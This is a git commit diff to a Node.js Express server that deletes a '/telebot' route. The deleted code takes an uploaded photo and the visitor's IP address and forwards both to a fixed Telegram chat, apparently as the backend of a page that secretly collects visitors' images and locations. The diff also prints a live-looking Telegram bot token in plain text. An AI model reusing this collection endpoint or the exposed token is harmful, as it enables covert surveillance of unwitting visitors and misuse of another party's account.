3eae473f2f6e79595a4c68b0894a2fd411ae11a8
Coco martin <150522458+joshuaAposto@users.noreply.github.com>
2024-11-10 07:40:49 +0800

    Update index.js

--- index.js
+++ index.js
@@ -1,14 +1,8 @@
 const express = require('express');
 const path = require('path');
-const axios = require('axios');
-const multer = require('multer');
-const FormData = require('form-data');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-
-const storage = multer.memoryStorage();
-const upload = multer({ storage: storage });
 
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
@@ -30,49 +24,6 @@ routes.forEach(route => {
     app.get(route.path, (req, res) => {
         res.sendFile(path.join(__dirname, 'public', route.file));
     });
-});
-
-app.post('/telebot', upload.single('photo'), (req, res) => {
-    const userId = '6229355025';
-    const token = '7846389597:AAHfE-4zLRONag3dRsWsI2RpXW9T_-Y6uwA';
-    const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-
-    const formData = new FormData();
-    formData.append('chat_id', userId);
-
-    if (req.file) {
-        const fileExtension = req.file.mimetype.split('/')[1];
-        const filename = `photo.${fileExtension}`;
-        formData.append('photo', req.file.buffer, { filename });
-        formData.append('caption', `User IP: ${ipAddress}`);
-        
-        axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
-            headers: formData.getHeaders(),
-        })
-        .then(() => {
-            console.log('Photo and IP sent successfully.');
-            res.sendStatus(200);
-        })
-        .catch(err => {
-            console.error('Error sending photo:', err.response ? err.response.data : err.message);
-            res.sendStatus(500);
-        });
-    } else {
-        const text = `User IP: ${ipAddress}`;
-
-        axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-            chat_id: userId,
-            text: text,
-        })
-        .then(() => {
-            console.log('IP sent successfully.');
-            res.sendStatus(200);
-        })
-        .catch(err => {
-            console.error('Error sending IP:', err.response ? err.response.data : err.message);
-            res.sendStatus(500);
-        });
-    }
 });
 
 app.listen(PORT, () => {
